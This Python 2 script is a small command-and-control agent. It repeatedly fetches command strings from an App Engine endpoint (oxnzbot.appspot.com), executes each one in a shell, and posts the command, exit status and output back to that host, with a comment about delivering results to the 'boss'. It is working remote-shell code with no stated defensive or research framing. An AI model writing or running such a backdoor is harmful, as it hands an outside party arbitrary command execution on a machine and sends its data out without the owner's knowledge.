import urllib
import urllib2
import socket
import cookielib
import commands

FROM = 'a@b.com'

def hpost(url, data, method='POST', proxy=True):
    if method == 'POST':
        req = urllib2.Request(url, data)
    else:
        req = urllib2.Request(url)
    if proxy:
        proxy_handler = urllib2.ProxyHandler({'http': 'http://localhost:8087'})
        opener = urllib2.build_opener(proxy_handler)
        urllib2.install_opener(opener)
    
    resp = urllib2.urlopen(req)
    return resp.read()

lurl = 'http://localhost:8080/_ah/xmpp/__0x01379/?from=a@b.com'
ourl = 'http://oxnzbot.appspot.com'
xgurl = 'http://oxnzbot.appspot.com/_ah/xmpp/__0x01379/?from=a@b.com'
xpurl = 'http://oxnzbot.appspot.com/_ah/xmpp/__0x01379/'
murl = 'http://oxnzbot.appspot.com/_ah/xmpp/message/chat/'
burl = 'http://www.baidu.com/'

def test(remote=True):
    if remote:
        while True:
            cmd = hpost(xgurl, None, method='GET', proxy=True)
            if cmd == '':
                print 'no command available'
            else:
                print 'executing command: %s' % cmd
                (status, output) = commands.getstatusoutput(cmd)
                data = urllib.urlencode({
                    'from': FROM,
                    'command': cmd,
                    'status': str(status),
                    'output': output,
                })
                # check if the server delivery msg to boss ok
                ret = hpost(xpurl, data, method='POST', proxy=True)
                if ret == '__0x0000':
                    break
                else:
                    pass
    else:
        print hpost(lurl, data, method='GET', proxy=False)
        print hpost(lurl, data, method='POST', proxy=False)

if __name__ == '__main__':
    #test(False)
    test()
